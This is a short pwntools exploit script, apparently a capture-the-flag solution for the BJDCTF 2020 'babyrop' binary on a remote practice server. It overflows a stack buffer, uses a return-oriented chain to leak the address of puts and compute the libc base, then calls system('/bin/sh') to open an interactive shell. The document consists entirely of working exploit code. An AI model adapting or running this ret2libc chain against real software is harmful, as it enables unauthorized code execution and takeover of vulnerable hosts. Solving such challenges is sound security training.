from pwn import *

context.log_level = "debug"

exe = ELF("./bjdctf_2020_babyrop")
# libc = exe.libc
libc = ELF("./libc-2.23.so")
# r = exe.process()
r = remote("node4.buuoj.cn", 27174)

# 0x0000000000400733 : pop rdi ; ret
# 0x00000000004004c9 : ret

pop_rdi = p64(0x400733)
ret = p64(0x4004c9)

r.recvuntil(b"story!\n")
r.sendline(
    cyclic(40) + ret + pop_rdi + p64(exe.got["puts"]) + p64(exe.plt["puts"]) +
    p64(exe.sym["main"]))
libc_puts = u64(r.recvline().strip() + b"\x00" * 2)
libc_base = libc_puts - libc.sym["puts"]
success("libc base: " + hex(libc_base))
libc_system = p64(libc_base + libc.sym["system"])
libc_bin_sh = p64(libc_base + next(libc.search(b"/bin/sh")))
r.recvuntil(b"story!\n")
r.sendline(cyclic(40) + pop_rdi + libc_bin_sh + libc_system)
r.interactive()
